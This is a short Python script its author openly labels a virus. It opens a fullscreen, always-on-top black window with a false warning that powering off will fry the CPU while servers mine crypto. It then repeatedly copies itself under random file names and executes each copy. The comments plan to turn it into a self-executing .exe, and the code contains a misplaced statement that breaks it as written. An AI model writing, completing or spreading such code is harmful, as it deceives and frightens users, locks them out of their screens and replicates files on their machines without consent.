"""
Produced by (you dont really need my name)
date: March 21 2022: RAMADAN SOON Boiss!!!
Disclaimer: dont be a bad boy/girl with this script please. not that its very effective in the first place
I literally only made this to shame (not important)
"""
# a virus like this should be self executable so add stuff for that later...
# Make it cooler you stupid nerd!
# does it even work? i need it to become a .exe...... hmm
# Above are mearly notes for myself, please ignore.
import os
import shutil
import tkinter as tk
import random as r 
import subprocess

root = tk.Tk()
cwd = os.getcwd()

def TagCreation():
    characters = list("qwertyuiopasdfghjklzxcvbnm123456789")
    tag = ""
    for i in range(0,8):
        tag += r.choice(characters)

    return tag

while True:

    root.geometry("24000x24000")
    root.title("CyberneticCookieMalware")
    root.attributes('-fullscreen',True)
    label = tk.Label(root, text="Powering off your Device will fry the CPU, just wait 1 mintue for our servers to mine some crypto!", font=('Arial',15))
    label.pack(padx=1, pady=1)
    root.configure(background='black')
    root.lift()
    root.geometry('2500x25000')

    value = TagCreation()
    new_file_name = f"OogaBooga{value}.py"
    new_file_path = os.path.join(cwd, new_file_name)
    shutil.copy(__file__, new_file_path)

    exec(open(f'{new_file_name}').read())
    

    root.call('wm', 'attributes', '.', '-topmost', '1')
    root.mainloop()
        pass

root.call('wm', 'attributes', '.', '-topmost', '1')
root.mainloop()

